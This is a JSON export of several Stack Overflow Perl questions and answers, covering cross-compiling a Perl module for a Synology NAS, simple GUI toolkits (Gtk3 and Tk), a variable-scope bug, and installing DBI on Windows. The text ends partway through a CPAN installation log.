[{"tags": ["perl", "cross-compiling", "perl-module", "synology"], "comments": [{"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1577351201, "post_id": 59482404, "comment_id": 105147360, "body": "What&#39;s the CPU architecture and operating system of the target system?"}, {"owner": {"reputation": 13, "user_id": 9755058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35520d549af991fb206c5a90ee1ac9bd?s=128&d=identicon&r=PG&f=1", "display_name": "fredlcore", "link": "https://stackoverflow.com/users/9755058/fredlcore"}, "reply_to_user": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1577368352, "post_id": 59482404, "comment_id": 105153133, "body": "@daxim: It&#39; an Intel Celeron J3355 (64 bit Intel) running a Linux-based OS called DSO (DiskStation Operating System)."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 9755058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35520d549af991fb206c5a90ee1ac9bd?s=128&d=identicon&r=PG&f=1", "display_name": "fredlcore", "link": "https://stackoverflow.com/users/9755058/fredlcore"}, "edited": false, "score": 0, "creation_date": 1577425745, "post_id": 59493739, "comment_id": 105166521, "body": "Sorry, should have thought about this myself, added it in the original post due to size limitations here."}, {"owner": {"reputation": 13, "user_id": 9755058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35520d549af991fb206c5a90ee1ac9bd?s=128&d=identicon&r=PG&f=1", "display_name": "fredlcore", "link": "https://stackoverflow.com/users/9755058/fredlcore"}, "edited": false, "score": 0, "creation_date": 1577446310, "post_id": 59493739, "comment_id": 105172726, "body": "This was pushing me to the right direction! Although I installed Perl using &quot;--both threads&quot;, perl -V was not showing USE_ITHREADS in the compile-time options. Only by explicitly installing it with <code>perlbrew install 5.24.0 -Dusethreads</code> it appeared. I have then copied both the resulting auto and Device folders to my home folder of the DS218 and now another strange thing happened: In the home folder, I can run <code>perl -MDevice::SerialPort -e &#39;print &quot;OK&quot;</code> fine, but if I copy it to the site_perl folder, I get the &quot;Cannot locate...&quot; error although the files exist with correct permissions."}, {"owner": {"reputation": 13, "user_id": 9755058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35520d549af991fb206c5a90ee1ac9bd?s=128&d=identicon&r=PG&f=1", "display_name": "fredlcore", "link": "https://stackoverflow.com/users/9755058/fredlcore"}, "edited": false, "score": 0, "creation_date": 1577446512, "post_id": 59493739, "comment_id": 105172801, "body": "Do you want to expand your answer with the infos from my comment? Since you gave me the important information necessary to get it running at least in theory, I would like to give you the correct solution marker. Otherwise, I&#39;ll answer my question myself and explain the process to get the module compiled correctly."}, {"owner": {"reputation": 13, "user_id": 9755058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35520d549af991fb206c5a90ee1ac9bd?s=128&d=identicon&r=PG&f=1", "display_name": "fredlcore", "link": "https://stackoverflow.com/users/9755058/fredlcore"}, "edited": false, "score": 0, "creation_date": 1577447585, "post_id": 59493739, "comment_id": 105173210, "body": "Sorry, I had a copying error which caused the &quot;Cannot find error&quot;, so please ignore the second half of my first comment, unfortunately, I cannot edit it anymore. Everything works great now, thanks a lot!"}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "reply_to_user": {"reputation": 13, "user_id": 9755058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35520d549af991fb206c5a90ee1ac9bd?s=128&d=identicon&r=PG&f=1", "display_name": "fredlcore", "link": "https://stackoverflow.com/users/9755058/fredlcore"}, "edited": false, "score": 0, "creation_date": 1577448492, "post_id": 59493739, "comment_id": 105173516, "body": "Go ahead and provide your own answer and accept it."}], "tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": false, "score": 0, "last_activity_date": 1577396420, "creation_date": 1577396420, "answer_id": 59493739, "question_id": 59482404, "link": "https://stackoverflow.com/questions/59482404/how-to-cross-compile-perl-modules-here-deviceserialport-for-synology-ds218/59493739#59493739", "title": "How to cross-compile Perl modules (here: Device::SerialPort) for Synology DS218+?", "body": "<p>To improve your replicated environment, run <code>perl -V</code> on the target system to see how it was configured. Relevant items, possibly more:</p>\n\n<pre><code>cccdlflags\nccdlflags\nccflags\nccversion\nconfig_args\ngccversion\ngnulibc_version\nlddlflags\nlibc\nlibs\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 9755058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35520d549af991fb206c5a90ee1ac9bd?s=128&d=identicon&r=PG&f=1", "display_name": "fredlcore", "link": "https://stackoverflow.com/users/9755058/fredlcore"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 198, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1577426215, "creation_date": 1577314679, "last_edit_date": 1577426215, "question_id": 59482404, "link": "https://stackoverflow.com/questions/59482404/how-to-cross-compile-perl-modules-here-deviceserialport-for-synology-ds218", "title": "How to cross-compile Perl modules (here: Device::SerialPort) for Synology DS218+?", "body": "<p>I am trying to build a Perl module (Device::SerialPort) for my Synology Diskstation DS218+ which runs on an Intel Celeron J3355 (Apollolake) processor. I managed to build even more complex packages for the Synology such as \"make\" via the spksrc Synology Toolchain in a Docker image running on the same machine, but have failed to do so with Perl modules.\nI have tried to just build them for the same Perl version that the DS218+ runs (currently 5.24.0) using perlbrew and copy the resulting files over, but the best I could get is an error such as \"undefined symbol: PL_stack_sp at /usr/local/share/perl5/core_perl/XSLoader.pm\".</p>\n\n<p>EDIT: Here are the outputs of perl -V on the target system:</p>\n\n<pre><code>[user@DS218 ~]$ perl -V\nSummary of my perl5 (revision 5 version 24 subversion 0) configuration:\nDerived from: fa04148f1272140cc97a02f4fca347a6540dc6b5\nPlatform:\nosname=linux, osvers=current, archname=x86_64-linux\nCompiler:\nLinker and Libraries:\nDynamic Linking:\nCharacteristics of this binary (from libperl): \nCompile-time options: HAS_TIMES MULTIPLICITY PERLIO_LAYERS\n                    PERL_COPY_ON_WRITE PERL_DONT_CREATE_GVSV\n                    PERL_HASH_FUNC_ONE_AT_A_TIME_HARD\n                    PERL_IMPLICIT_CONTEXT PERL_MALLOC_WRAP\n                    PERL_PRESERVE_IVUV USE_64_BIT_ALL USE_ITHREADS\n                    USE_LARGE_FILES USE_LOCALE USE_LOCALE_COLLATE\n                    USE_LOCALE_CTYPE USE_LOCALE_NUMERIC USE_LOCALE_TIME\n                    USE_PERLIO USE_PERL_ATOF USE_REENTRANT_API\nLocally applied patches:\nuncommitted-changes\nBuilt under linux\nCompiled at Jan 21 2019 19:42:02\n@INC:\n/usr/local/lib/perl5/site_perl\n/usr/local/share/perl5/site_perl\n/usr/local/lib/perl5/vendor_perl\n/usr/local/share/perl5/vendor_perl\n/usr/local/lib/perl5/core_perl\n/usr/local/share/perl5/core_perl\n</code></pre>\n\n<p>I know I could install a third party package manager such as IPGK, but I don't want the overhead (plus like to learn ;) ). I'd settle for a pre-compiled binary that actually works on the DS218+ if someone could point me to it.</p>\n\n<p>(And for those not knowing the DS218+ well enough: CPAN is not an option because the Synologies are not shipped with a C compiler, and cross-compiling gcc with the Toolchain is equally frustrating).</p>\n\n<p>Thanks a lot in advance for any pointers!</p>\n"}, {"tags": ["perl", "user-interface", "sh"], "answers": [{"tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": true, "score": 2, "last_activity_date": 1577310652, "creation_date": 1577310652, "answer_id": 59482078, "question_id": 59481585, "link": "https://stackoverflow.com/questions/59481585/is-there-a-tool-like-pysimplegui-for-perl/59482078#59482078", "title": "Is there a tool like PySimpleGUI for Perl?", "body": "<p>I was not able to find anything like <code>PySimpleGUI</code> in Perl. I think you need to build the gui based on the full api of the toolkit (and not a simplified version of the api like <code>PySimpleGUI</code>). I know that the <a href=\"https://metacpan.org/pod/Gtk3\" rel=\"nofollow noreferrer\">Gtk3</a>\nand <a href=\"https://metacpan.org/pod/distribution/Tk/Tk.pod\" rel=\"nofollow noreferrer\">Tk</a> toolkits are actively used. There are also the <a href=\"https://metacpan.org/pod/Wx\" rel=\"nofollow noreferrer\">Wx</a> and <a href=\"https://metacpan.org/pod/QtCore4\" rel=\"nofollow noreferrer\">QtCore4</a> toolkits, but these are less used and not actively maintained in my opinion.</p>\n\n<p>Here is an example in <code>Gtk3</code>:</p>\n\n<pre><code>use feature qw(say);\nuse strict;\nuse warnings;\nuse Gtk3 -init;\n\nmy $window = Gtk3::Window-&gt;new( 'toplevel' );\n$window-&gt;signal_connect( destroy  =&gt; sub { Gtk3-&gt;main_quit() } );\nmy $grid = Gtk3::Grid-&gt;new();\n$window-&gt;add( $grid );\nmy $label1 = Gtk3::Label-&gt;new('Some text on Row 1');\n$grid-&gt;attach($label1, 0,0,1,1);\nmy $label2 = Gtk3::Label-&gt;new('Enter something on Row 2');\n$grid-&gt;attach($label2, 0,1,1,1);\nmy $entry = Gtk3::Entry-&gt;new();\n$grid-&gt;attach($entry, 1,1,1,1);\nmy $button1 = Gtk3::Button-&gt;new('Ok');\n$button1-&gt;signal_connect('clicked' =&gt; sub { say \"You entered \", $entry-&gt;get_text( ) } );\n$grid-&gt;attach($button1, 0,2,1,1);\nmy $button2 = Gtk3::Button-&gt;new('Cancel');\n$button2-&gt;signal_connect('clicked' =&gt; sub { $window-&gt;destroy() } );\n$grid-&gt;attach($button2, 1,2,1,1);\n$window-&gt;set_position('center_always');\n$window-&gt;show_all();\nGtk3-&gt;main();\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1934, "user_id": 10667839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9ee13d3681ace95a1c13693db607f72?s=128&d=identicon&r=PG&f=1", "display_name": "clamp", "link": "https://stackoverflow.com/users/10667839/clamp"}, "is_accepted": false, "score": 2, "last_activity_date": 1577469930, "creation_date": 1577469930, "answer_id": 59504474, "question_id": 59481585, "link": "https://stackoverflow.com/questions/59481585/is-there-a-tool-like-pysimplegui-for-perl/59504474#59504474", "title": "Is there a tool like PySimpleGUI for Perl?", "body": "<p>Here is H\u00e5kon's example using <a href=\"https://metacpan.org/pod/distribution/Tk/Tk.pod\" rel=\"nofollow noreferrer\">Tk</a></p>\n\n<pre><code>use feature qw(say);\nuse strict;\nuse warnings;\nuse Tk;\nmy $text= '';\nmy $window = tkinit();\n$window-&gt;Label(-text =&gt;'Some text on Row 1')-&gt;grid();\n$window-&gt;Label(-text=&gt;'Enter something on Row 2',\n           )-&gt;grid(\n    $window-&gt;Entry(-textvariable=&gt; \\$text)\n);\n$window-&gt;Button(-text=&gt;'Ok',\n                -command=&gt;sub{say \"You entered $text\"},\n            )-&gt;grid(\n    $window-&gt;Button(-text=&gt;'Cancel',-command=&gt;sub{Tk::exit})\n);\n$window-&gt;withdraw;\n$window-&gt;Popup;\nMainLoop;\n</code></pre>\n"}], "owner": {"reputation": 5733, "user_id": 463994, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/aveH2.jpg?s=128&g=1", "display_name": "MountainX", "link": "https://stackoverflow.com/users/463994/mountainx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 120, "favorite_count": 1, "accepted_answer_id": 59482078, "answer_count": 2, "score": 3, "last_activity_date": 1577469930, "creation_date": 1577305211, "question_id": 59481585, "link": "https://stackoverflow.com/questions/59481585/is-there-a-tool-like-pysimplegui-for-perl", "title": "Is there a tool like PySimpleGUI for Perl?", "body": "<p>I am looking for a Perl GUI tool that is as simple as <a href=\"https://github.com/PySimpleGUI/PySimpleGUI\" rel=\"nofollow noreferrer\">PySimpleGUI</a>. PySimpleGUI claims to be a good choice for things like this:</p>\n\n<ul>\n<li>add the convenience of a simple GUI onto a CLI Perl script.</li>\n<li>share some cool Perl tools I run from the terminal but give the (internal) users a simple GUI</li>\n<li>share my Perl programs with friends or family (that aren't so comfortable with the CLI)</li>\n<li>run a program in the system tray (potentially)</li>\n<li>looking for a GUI package that is \"supported\" and is being constantly developed and improved</li>\n<li>good documentation and examples</li>\n</ul>\n\n<p>Those are my requirements and because PySimpleGUI offers all that, I gave it a try for a project. I liked it. That prompted to to try to find something like it for <strong>Perl</strong>.</p>\n\n<p>I'm running perl 5, version 30 on Linux with KDE. </p>\n\n<p>So far I only found: </p>\n\n<ul>\n<li>saiftynet/GUIDeFATE: GUI Design From A Text Editor <a href=\"https://github.com/saiftynet/GUIDeFATE\" rel=\"nofollow noreferrer\">https://github.com/saiftynet/GUIDeFATE</a></li>\n</ul>\n\n<p>I was not able to get the examples to run, and the supplied documentation doesn't meet my requirements. (I will ask about my specific problems with GUIDeFATE in a separate question, but GUIDeFATE is not actively developed like PySimpleGUI.)</p>\n\n<p>I have used <a href=\"https://github.com/KDE/kdialog\" rel=\"nofollow noreferrer\">Kdialog</a> for bash scripts in the past and it is not what I have in mind.</p>\n\n<p><strong>Is there an equivalent of PySimpleGUI for Perl?</strong></p>\n"}, {"tags": ["regex", "perl", "if-statement", "initialization"], "comments": [{"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 1, "creation_date": 1577284092, "post_id": 59479104, "comment_id": 105135522, "body": "What&#39;s the scope of a variable declared with <code>my</code>?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1577298927, "post_id": 59479104, "comment_id": 105138626, "body": "Always use <code>use strict; use warnings;</code>"}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 1, "creation_date": 1577301627, "post_id": 59479104, "comment_id": 105139125, "body": "Is <b>$valid</b> stores a digit or string value? Operation <b>eq</b> applies to strings, but after <b>eq</b> you have a digit.  <a href=\"https://users.cs.cf.ac.uk/Dave.Marshall/PERL/node37.html\" rel=\"nofollow noreferrer\">users.cs.cf.ac.uk/Dave.Marshall/PERL/node37.html</a>"}], "answers": [{"tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": 1, "last_activity_date": 1577284773, "creation_date": 1577284773, "answer_id": 59479382, "question_id": 59479104, "link": "https://stackoverflow.com/questions/59479104/uninitialized-value-in-regex-compilation-in-perl/59479382#59479382", "title": "uninitialized value in regex compilation in perl", "body": "<ol>\n<li><p>Perl program needs <code>(pragma: A pragma is a module which influences some aspect of the compile time or run time behaviour of Perl, such as strict or warnings)</code>. Unless until we see the full code.</p></li>\n<li><p>Please understand the declaration of the variables inside the block and outside of the block.</p></li>\n</ol>\n\n<blockquote>\n  <p>Coming to your code:</p>\n</blockquote>\n\n<pre><code> if($valid eq 1)\n {\n      print \"Enter value\\n\" ;\n      my $value = &lt;STDIN&gt;;\n      #This the \"$value\" prints what you have get from the MS-Dos Prompt from the user.\n      #$value ends here since the $value has been declared this block\n }\n</code></pre>\n\n<p>$value needs to declare outside the <code>if-else</code> block you won't get the error message.</p>\n\n<pre><code> my $value = \"\";\n if($valid eq 1)\n {\n      print \"Enter value\\n\" ;\n      $value = &lt;STDIN&gt;;\n      chomp($value); #Additionally, you should chomp (remove the entermark at end of the value $value;\n }\n</code></pre>\n\n<p>Thanks.</p>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1577303253, "last_edit_date": 1577303253, "creation_date": 1577302166, "answer_id": 59481295, "question_id": 59479104, "link": "https://stackoverflow.com/questions/59479104/uninitialized-value-in-regex-compilation-in-perl/59481295#59481295", "title": "uninitialized value in regex compilation in perl", "body": "<p>I took some liberty to alter your code to make it work \n[enter <strong>dog</strong> or <strong>cat</strong> at the prompt for a test]</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $valid = '1';\nmy $value;\n\nmy $line    = 'Some lazy dog is taking a sun bath';\nmy $string  = 'lazy';\n\nif($valid eq '1'){\n    print \"Enter value: \" ;\n    $value = &lt;STDIN&gt;;\n    chomp $value;\n}else{\n    print \" valid is not 1 \\n\";\n}\n\nif( $line =~ /$string.*$value/ ){  \n    print 'Horay!!! I found the string - ';\n    print \"$line\\n\";\n} else {\n    print \"Sorry, no line found\\n\";\n}\n</code></pre>\n\n<p>Your error is hidden in scope declaration of <strong>$value</strong> -- it is only valid for <strong>if</strong> internal block of code - I have moved it outside of <strong>if ... else ...</strong> block.</p>\n\n<p>NOTE: perhaps you intended to write</p>\n\n<pre><code>my $valid = 1;\n....\nif( $valid ) {\n   ....\n} else {\n   ....\n}\n</code></pre>\n\n<p>although the following code is valid but in this particular case is excessive (if <strong>$valid</strong> is <strong>not zero</strong> it considered <strong>true</strong>)</p>\n\n<pre><code>if( $valid == 1 ) {\n   ....\n} else {\n   ....\n}\n</code></pre>\n\n<p><a href=\"https://users.cs.cf.ac.uk/Dave.Marshall/PERL/node37.html\" rel=\"nofollow noreferrer\">Comparison operators for numbers and strings</a></p>\n"}], "owner": {"reputation": 59, "user_id": 12401841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4bbcce32d293e478b08a712d3f19f674?s=128&d=identicon&r=PG&f=1", "display_name": "techie", "link": "https://stackoverflow.com/users/12401841/techie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 105, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1577303253, "creation_date": 1577282416, "question_id": 59479104, "link": "https://stackoverflow.com/questions/59479104/uninitialized-value-in-regex-compilation-in-perl", "title": "uninitialized value in regex compilation in perl", "body": "<p>The below code is giving an error when I use if-else block for the comparison of $valid. When if-else condition is not used the error is not there. The error is \" Use of uninitialized value $value in regexp compilation\".How to solve this?</p>\n\n<pre><code>...\nif($valid eq 1){\nprint \"Enter value\\n\" ;\nmy $value = &lt;STDIN&gt;;\n}else{\n  print \" valid is not 1 \\n\";\n}\nif($line =~ /$string.*$value/){  --&gt; error\n    //code\n}\n</code></pre>\n"}, {"tags": ["perl", "xampp", "cpan"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1577272868, "post_id": 59477263, "comment_id": 105132841, "body": "<i>&quot;&#39;dmake&#39; is not recognized as an internal or external command..&quot;</i> : Looks like the <code>dmake</code> executable is not supported any more. <a href=\"https://metacpan.org/source/SHAY/dmake-4.12.2.2\" rel=\"nofollow noreferrer\">Here</a> I found an executable from 2014, can you try it? If it is too old, you might need to use <code>gmake</code> instead. See also <a href=\"https://stackoverflow.com/q/56972534/2173773\">How to install dmake with perl?</a>, <a href=\"https://stackoverflow.com/q/58104250/2173773\">dmake not found when installing Perl module using CPAN</a>"}, {"owner": {"reputation": 27, "user_id": 5999765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/005ee62182541ca66d93d0b324678a98?s=128&d=identicon&r=PG&f=1", "display_name": "StuckAtDatQ", "link": "https://stackoverflow.com/users/5999765/stuckatdatq"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1577272910, "post_id": 59477263, "comment_id": 105132851, "body": "But how do I chance that? I thought the installer would figure that out by itself? :) Should I go for gmake or the one in the link?  All this installation stuff is driving me crazy. two month ago I was struggling with the same issue on my mac, but ended giving up. Now the same issue on my PC... sigh! .... -  I only want to be coding stuff, not all this installation stuff. :-("}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1577299037, "post_id": 59477263, "comment_id": 105138652, "body": "IIRC, <code>cpan dmake</code> will install it. (Didn&#39;t it used to do that automatically???)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1577693411, "post_id": 59477263, "comment_id": 105225400, "body": "@daxim, They&#39;re not using XAMPP. They were, but switched to ActivePerl."}], "answers": [{"comments": [{"owner": {"reputation": 27, "user_id": 5999765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/005ee62182541ca66d93d0b324678a98?s=128&d=identicon&r=PG&f=1", "display_name": "StuckAtDatQ", "link": "https://stackoverflow.com/users/5999765/stuckatdatq"}, "edited": false, "score": 1, "creation_date": 1577326410, "post_id": 59482376, "comment_id": 105142521, "body": "I uninstalled ActiveState Perl, and installed Strawberry Perl instead. Then cpan, DBI and DBD-mysql. And changed #!&quot;C:\\strawberry\\perl\\bin\\perl.exe&quot;."}], "tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": true, "score": 4, "last_activity_date": 1577314150, "creation_date": 1577314150, "answer_id": 59482376, "question_id": 59477263, "link": "https://stackoverflow.com/questions/59477263/why-will-it-not-install-dbi/59482376#59482376", "title": "Why will it not install DBI?", "body": "<p>Previously, ActiveState Perl would automatically install <code>dmake</code> and <code>MinGW</code> for you, see <a href=\"https://stackoverflow.com/q/10545976/2173773\">\u201cppm.bat install failed: Can't find any package that provides MinGW\u201d</a>.</p>\n\n<p>I tried to install <code>perl</code> version 5.28.1 using the new ActiveState Platform, see <a href=\"https://code.activestate.com/ppm/\" rel=\"nofollow noreferrer\">notice</a> at the PPM index:</p>\n\n<blockquote>\n  <p>Notice! PPM is being replaced with the ActiveState Platform, which\n  enhances PPM\u2019s build and deploy capabilities. Create your free\n  Platform account to download ActivePerl or customize Perl with the\n  packages you require and get automatic updates.</p>\n</blockquote>\n\n<p>but there is no <code>MinGW</code> package when I choose \"Add packages\" from the \"Configuration\" tab at my Perl project from the <a href=\"https://platform.activestate.com/\" rel=\"nofollow noreferrer\">ActiveState Platform</a>. </p>\n\n<p>However, for the old PPM with <code>perl</code> version 5.24 there is a <a href=\"https://code.activestate.com/ppm/MinGW/\" rel=\"nofollow noreferrer\"><code>MinGW</code> package</a>. </p>\n\n<p>Also, if I try run from the Command Prompt:</p>\n\n<pre><code>&gt;ppm install MinGW\nppm install failed: Can't find any package that provides MinGW\n</code></pre>\n\n<p>I would recommend using <a href=\"http://strawberryperl.com/\" rel=\"nofollow noreferrer\">Strawberry Perl</a> until this problem with ActivePerl is fixed.</p>\n"}], "owner": {"reputation": 27, "user_id": 5999765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/005ee62182541ca66d93d0b324678a98?s=128&d=identicon&r=PG&f=1", "display_name": "StuckAtDatQ", "link": "https://stackoverflow.com/users/5999765/stuckatdatq"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1166, "favorite_count": 0, "accepted_answer_id": 59482376, "answer_count": 1, "score": 1, "last_activity_date": 1577314150, "creation_date": 1577268207, "question_id": 59477263, "link": "https://stackoverflow.com/questions/59477263/why-will-it-not-install-dbi", "title": "Why will it not install DBI?", "body": "<p>I have installed XAMPP on windows 10.\nRunning Apache and mySQL, works fine. I was testing Perl, and it worked too. However it can't connect to mySQL, so I tried to install DBI, but neither PPM or CPAN was recognized by DOS. So I installed ActiveState-Perl, and then used CPAN to install DBI, and you can see the result below.</p>\n\n<p>Any ideas will help! Thanks!!</p>\n\n<pre><code>Reading 'C:\\Perl64\\cpan\\Metadata'\n  Database was generated on Tue, 24 Dec 2019 06:29:03 GMT\nRunning install for module 'DBI'\nChecksum for C:\\Perl64\\cpan\\sources\\authors\\id\\T\\TI\\TIMB\\DBI-1.642.tar.gz ok\nScanning cache C:\\Perl64/cpan/build for sizes\n........................................................................----DONE\nDEL(1/1): C:\\Perl64\\cpan\\build\\DBI-1.642-0.yml\nDBI-1.642/\nDBI-1.642/DBI.pm\nDBI-1.642/dbipport.h\nDBI-1.642/INSTALL\nDBI-1.642/dbixs_rev.pl\nDBI-1.642/Perl.xs\nDBI-1.642/dbivport.h\nDBI-1.642/LICENSE\nDBI-1.642/dbi_sql.h\nDBI-1.642/Changes\nDBI-1.642/dbilogstrip.PL\nDBI-1.642/MANIFEST\nDBI-1.642/ex/\nDBI-1.642/dbiprof.PL\nDBI-1.642/Driver.xst\nDBI-1.642/t/\nDBI-1.642/DBI.xs\nDBI-1.642/test.pl\nDBI-1.642/README.md\nDBI-1.642/dbd_xsh.h\nDBI-1.642/typemap\nDBI-1.642/dbixs_rev.h\nDBI-1.642/dbiproxy.PL\nDBI-1.642/DBIXS.h\nDBI-1.642/META.yml\nDBI-1.642/lib/\nDBI-1.642/Makefile.PL\nDBI-1.642/Driver_xst.h\nDBI-1.642/META.json\nDBI-1.642/lib/DBI/\nDBI-1.642/lib/Bundle/\nDBI-1.642/lib/DBD/\nDBI-1.642/lib/Win32/\nDBI-1.642/lib/Win32/DBIODBC.pm\nDBI-1.642/lib/DBD/DBM.pm\nDBI-1.642/lib/DBD/NullP.pm\nDBI-1.642/lib/DBD/File/\nDBI-1.642/lib/DBD/Proxy.pm\nDBI-1.642/lib/DBD/ExampleP.pm\nDBI-1.642/lib/DBD/Gofer/\nDBI-1.642/lib/DBD/File.pm\nDBI-1.642/lib/DBD/Mem.pm\nDBI-1.642/lib/DBD/Gofer.pm\nDBI-1.642/lib/DBD/Sponge.pm\nDBI-1.642/lib/DBD/Gofer/Transport/\nDBI-1.642/lib/DBD/Gofer/Policy/\nDBI-1.642/lib/DBD/Gofer/Policy/classic.pm\nDBI-1.642/lib/DBD/Gofer/Policy/pedantic.pm\nDBI-1.642/lib/DBD/Gofer/Policy/Base.pm\nDBI-1.642/lib/DBD/Gofer/Policy/rush.pm\nDBI-1.642/lib/DBD/Gofer/Transport/pipeone.pm\nDBI-1.642/lib/DBD/Gofer/Transport/null.pm\nDBI-1.642/lib/DBD/Gofer/Transport/stream.pm\nDBI-1.642/lib/DBD/Gofer/Transport/corostream.pm\nDBI-1.642/lib/DBD/Gofer/Transport/Base.pm\nDBI-1.642/lib/DBD/File/Developers.pod\nDBI-1.642/lib/DBD/File/Roadmap.pod\nDBI-1.642/lib/DBD/File/HowTo.pod\nDBI-1.642/lib/Bundle/DBI.pm\nDBI-1.642/lib/DBI/ProfileDumper.pm\nDBI-1.642/lib/DBI/Util/\nDBI-1.642/lib/DBI/PurePerl.pm\nDBI-1.642/lib/DBI/Profile.pm\nDBI-1.642/lib/DBI/Gofer/\nDBI-1.642/lib/DBI/ProfileData.pm\nDBI-1.642/lib/DBI/Const/\nDBI-1.642/lib/DBI/DBD.pm\nDBI-1.642/lib/DBI/W32ODBC.pm\nDBI-1.642/lib/DBI/ProxyServer.pm\nDBI-1.642/lib/DBI/DBD/\nDBI-1.642/lib/DBI/ProfileSubs.pm\nDBI-1.642/lib/DBI/Pr